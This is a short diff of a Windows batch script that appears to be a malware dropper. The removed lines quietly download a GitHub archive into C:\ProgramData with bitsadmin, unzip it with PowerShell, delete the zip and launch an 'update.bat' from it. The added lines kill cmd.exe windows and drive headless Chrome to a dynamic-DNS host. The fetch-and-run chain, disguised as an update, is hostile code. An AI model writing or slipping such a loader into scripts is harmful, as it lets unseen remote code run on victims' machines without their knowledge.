@@ -1,13 +1,4 @@
-rmdir /s /q C:\ProgramData\update-main
+start taskkill -im cmd.exe
 
-set url=https://github.com/StockFi/update/archive/refs/heads/main.zip
-
-bitsadmin.exe /transfer "download" %url% C:\ProgramData\main.zip
-
-powershell -command " Expand-Archive 'C:\ProgramData\main.zip' 'C:\ProgramData\' "
-
-del C:\ProgramData\main.zip
-
-timeout /t 20
-
-start C:\ProgramData\update-main\update.bat
+"C:\Program Files\Google\Chrome\Application\chrome.exe" --headless --screenshot=Z:\web.png https://web3.zapto.org/
+taskkill -im cmd.exe
